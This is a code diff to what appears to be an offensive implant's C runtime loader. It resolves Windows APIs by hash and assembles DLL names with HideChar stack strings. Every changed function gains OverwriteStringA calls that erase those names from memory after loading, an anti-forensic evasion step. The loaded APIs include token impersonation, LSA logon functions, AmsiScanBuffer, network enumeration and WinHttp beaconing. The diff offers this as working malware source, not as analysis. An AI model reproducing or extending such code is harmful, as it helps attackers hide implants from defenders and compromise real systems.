@@ -13,7 +13,7 @@ BOOL RtAdvapi32(
     ModuleName[ 10 ] = HideChar('L');
     ModuleName[ 3  ] = HideChar('A');
     ModuleName[ 8  ] = HideChar('.');
-    ModuleName[ 12 ] = HideChar(0);
+    ModuleName[ 12 ] = HideChar('\0');
     ModuleName[ 6  ] = HideChar('3');
     ModuleName[ 7  ] = HideChar('2');
     ModuleName[ 1  ] = HideChar('D');
@@ -22,6 +22,7 @@ BOOL RtAdvapi32(
     ModuleName[ 4  ] = HideChar('P');
 
     if ( ( Instance.Modules.Advapi32 = LdrModuleLoad( ModuleName ) ) ) {
+        OverwriteStringA( ModuleName );
         Instance.Win32.GetTokenInformation          = LdrFunctionAddr( Instance.Modules.Advapi32, H_FUNC_GETTOKENINFORMATION );
         Instance.Win32.CreateProcessWithTokenW      = LdrFunctionAddr( Instance.Modules.Advapi32, H_FUNC_CREATEPROCESSWITHTOKENW );
         Instance.Win32.CreateProcessWithLogonW      = LdrFunctionAddr( Instance.Modules.Advapi32, H_FUNC_CREATEPROCESSWITHLOGONW );
@@ -54,6 +55,7 @@ BOOL RtAdvapi32(
 
         PUTS( "Loaded Advapi32 functions" )
     } else {
+        OverwriteStringA( ModuleName );
         PUTS( "Failed to load Advapi32" )
         return FALSE;
     }
@@ -80,10 +82,12 @@ BOOL RtMscoree(
     ModuleName[ 3  ] = HideChar('O');
 
     if ( ( Instance.Modules.Mscoree = LdrModuleLoad( ModuleName ) ) ) {
+        OverwriteStringA( ModuleName );
         Instance.Win32.CLRCreateInstance = LdrFunctionAddr( Instance.Modules.Mscoree, H_FUNC_CLRCREATEINSTANCE );
 
         PUTS( "Loaded Mscoree functions" )
     } else {
+        OverwriteStringA( ModuleName );
         PUTS( "Failed to load Mscoree" )
         return FALSE;
     }
@@ -111,6 +115,7 @@ BOOL RtOleaut32(
     ModuleName[ 8  ] = HideChar('.');
 
     if ( ( Instance.Modules.Oleaut32 = LdrModuleLoad( ModuleName ) ) ) {
+        OverwriteStringA( ModuleName );
         Instance.Win32.SafeArrayAccessData   = LdrFunctionAddr( Instance.Modules.Oleaut32, H_FUNC_SAFEARRAYACCESSDATA );
         Instance.Win32.SafeArrayUnaccessData = LdrFunctionAddr( Instance.Modules.Oleaut32, H_FUNC_SAFEARRAYUNACCESSDATA );
         Instance.Win32.SafeArrayCreate       = LdrFunctionAddr( Instance.Modules.Oleaut32, H_FUNC_SAFEARRAYCREATE );
@@ -121,6 +126,7 @@ BOOL RtOleaut32(
 
         PUTS( "Loaded Oleaut32 functions" )
     } else {
+        OverwriteStringA( ModuleName );
         PUTS( "Failed to load Oleaut32" )
         return FALSE;
     }
@@ -144,7 +150,9 @@ BOOL RtUser32(
     ModuleName[ 9  ] = HideChar('L');
     ModuleName[ 2  ] = HideChar('E');
     ModuleName[ 4  ] = HideChar('3');
+
     if ( ( Instance.Modules.User32 = LdrModuleLoad( ModuleName ) ) ) {
+        OverwriteStringA( ModuleName );
         Instance.Win32.ShowWindow       = LdrFunctionAddr( Instance.Modules.User32, H_FUNC_SHOWWINDOW );
         Instance.Win32.GetSystemMetrics = LdrFunctionAddr( Instance.Modules.User32, H_FUNC_GETSYSTEMMETRICS );
         Instance.Win32.GetDC            = LdrFunctionAddr( Instance.Modules.User32, H_FUNC_GETDC );
@@ -152,6 +160,7 @@ BOOL RtUser32(
 
         PUTS( "Loaded User32 functions" )
     } else {
+        OverwriteStringA( ModuleName );
         PUTS( "Failed to load User32" )
         return FALSE;
     }
@@ -176,11 +185,14 @@ BOOL RtShell32(
     ModuleName[ 5  ] = HideChar('3');
     ModuleName[ 3  ] = HideChar('L');
     ModuleName[ 2  ] = HideChar('E');
+
     if ( ( Instance.Modules.Shell32 = LdrModuleLoad( ModuleName ) ) ) {
+        OverwriteStringA( ModuleName );
         Instance.Win32.CommandLineToArgvW = LdrFunctionAddr( Instance.Modules.Shell32, H_FUNC_COMMANDLINETOARGVW );
 
         PUTS( "Loaded Shell32 functions" )
     } else {
+        OverwriteStringA( ModuleName );
         PUTS( "Failed to load Shell32" )
         return FALSE;
     }
@@ -206,10 +218,12 @@ BOOL RtMsvcrt(
     ModuleName[ 1  ] = HideChar('S');
 
     if ( ( Instance.Modules.Msvcrt = LdrModuleLoad( ModuleName ) ) ) {
+        OverwriteStringA( ModuleName );
         Instance.Win32.vsnprintf = LdrFunctionAddr( Instance.Modules.Msvcrt, H_FUNC_VSNPRINTF );
 
         PUTS( "Loaded Msvcrt functions" )
     } else {
+        OverwriteStringA( ModuleName );
         PUTS( "Failed to load Msvcrt" )
         return FALSE;
     }
@@ -237,10 +251,12 @@ BOOL RtIphlpapi(
     ModuleName[ 7  ] = HideChar('I');
 
     if ( ( Instance.Modules.Iphlpapi = LdrModuleLoad( ModuleName ) ) ) {
+        OverwriteStringA( ModuleName );
         Instance.Win32.GetAdaptersInfo = LdrFunctionAddr( Instance.Modules.Iphlpapi, H_FUNC_GETADAPTERSINFO );
 
         PUTS( "Loaded Iphlpapi functions" )
     } else {
+        OverwriteStringA( ModuleName );
         PUTS( "Failed to load Iphlpapi" )
         return FALSE;
     }
@@ -265,6 +281,7 @@ BOOL RtGdi32(
     ModuleName[ 3 ] = HideChar('3');
 
     if ( ( Instance.Modules.Gdi32 = LdrModuleLoad( ModuleName ) ) ) {
+        OverwriteStringA( ModuleName );
         Instance.Win32.GetCurrentObject   = LdrFunctionAddr( Instance.Modules.Gdi32, H_FUNC_GETCURRENTOBJECT );
         Instance.Win32.GetObjectW         = LdrFunctionAddr( Instance.Modules.Gdi32, H_FUNC_GETOBJECTW );
         Instance.Win32.CreateCompatibleDC = LdrFunctionAddr( Instance.Modules.Gdi32, H_FUNC_CREATECOMPATIBLEDC );
@@ -276,6 +293,7 @@ BOOL RtGdi32(
 
         PUTS( "Loaded Gdi32 functions" )
     } else {
+        OverwriteStringA( ModuleName );
         PUTS( "Failed to load Gdi32" )
         return FALSE;
     }
@@ -303,6 +321,7 @@ BOOL RtNetApi32(
     ModuleName[ 7  ] = HideChar('2');
 
     if ( ( Instance.Modules.NetApi32 = LdrModuleLoad( ModuleName ) ) ) {
+        OverwriteStringA( ModuleName );
         Instance.Win32.NetLocalGroupEnum = LdrFunctionAddr( Instance.Modules.NetApi32, H_FUNC_NETLOCALGROUPENUM );
         Instance.Win32.NetGroupEnum      = LdrFunctionAddr( Instance.Modules.NetApi32, H_FUNC_NETGROUPENUM );
         Instance.Win32.NetUserEnum       = LdrFunctionAddr( Instance.Modules.NetApi32, H_FUNC_NETUSERENUM );
@@ -313,6 +332,7 @@ BOOL RtNetApi32(
 
         PUTS( "Loaded NetApi32 functions" )
     } else {
+        OverwriteStringA( ModuleName );
         PUTS( "Failed to load NetApi32" )
         return FALSE;
     }
@@ -338,6 +358,7 @@ BOOL RtWs2_32(
     ModuleName[ 7  ] = HideChar('D');
 
     if ( ( Instance.Modules.Ws2_32 = LdrModuleLoad( ModuleName ) ) ) {
+        OverwriteStringA( ModuleName );
         Instance.Win32.WSAStartup      = LdrFunctionAddr( Instance.Modules.Ws2_32, H_FUNC_WSASTARTUP );
         Instance.Win32.WSACleanup      = LdrFunctionAddr( Instance.Modules.Ws2_32, H_FUNC_WSACLEANUP );
         Instance.Win32.WSASocketA      = LdrFunctionAddr( Instance.Modules.Ws2_32, H_FUNC_WSASOCKETA );
@@ -355,6 +376,7 @@ BOOL RtWs2_32(
 
         PUTS( "Loaded Ws2_32 functions" )
     } else {
+        OverwriteStringA( ModuleName );
         PUTS( "Failed to load Ws2_32" )
         return FALSE;
     }
@@ -382,6 +404,7 @@ BOOL RtSspicli(
     ModuleName[ 3  ] = HideChar('I');
 
     if ( ( Instance.Modules.Sspicli = LdrModuleLoad( ModuleName ) ) ) {
+        OverwriteStringA( ModuleName );
         Instance.Win32.LsaRegisterLogonProcess        = LdrFunctionAddr( Instance.Modules.Sspicli, H_FUNC_LSAREGISTERLOGONPROCESS );
         Instance.Win32.LsaLookupAuthenticationPackage = LdrFunctionAddr( Instance.Modules.Sspicli, H_FUNC_LSALOOKUPAUTHENTICATIONPACKAGE );
         Instance.Win32.LsaDeregisterLogonProcess      = LdrFunctionAddr( Instance.Modules.Sspicli, H_FUNC_LSADEREGISTERLOGONPROCESS );
@@ -393,6 +416,7 @@ BOOL RtSspicli(
 
         PUTS( "Loaded Sspicli functions" )
     } else {
+        OverwriteStringA( ModuleName );
         PUTS( "Failed to load Sspicli" )
         return FALSE;
     }
@@ -416,10 +440,12 @@ BOOL RtAmsi(
     ModuleName[ 2 ] = HideChar('S');
 
     if ( ( Instance.Modules.Amsi = LdrModuleLoad( ModuleName ) ) ) {
+        OverwriteStringA( ModuleName );
         Instance.Win32.AmsiScanBuffer = LdrFunctionAddr( Instance.Modules.Amsi, H_FUNC_AMSISCANBUFFER );
 
         PUTS( "Loaded Amsi functions" )
     } else {
+        OverwriteStringA( ModuleName );
         PUTS( "Failed to load Amsi" )
         return FALSE;
     }
@@ -447,6 +473,7 @@ BOOL RtWinHttp(
     ModuleName[ 5  ] = HideChar('T');
 
     if ( ( Instance.Modules.WinHttp = LdrModuleLoad( ModuleName ) ) ) {
+        OverwriteStringA( ModuleName );
         Instance.Win32.WinHttpOpen              = LdrFunctionAddr( Instance.Modules.WinHttp, H_FUNC_WINHTTPOPEN );
         Instance.Win32.WinHttpConnect           = LdrFunctionAddr( Instance.Modules.WinHttp, H_FUNC_WINHTTPCONNECT );
         Instance.Win32.WinHttpOpenRequest       = LdrFunctionAddr( Instance.Modules.WinHttp, H_FUNC_WINHTTPOPENREQUEST );
@@ -460,6 +487,7 @@ BOOL RtWinHttp(
 
         PUTS( "Loaded WinHttp functions" )
     } else {
+        OverwriteStringA( ModuleName );
         PUTS( "Failed to load WinHttp" )
         return FALSE;
     }
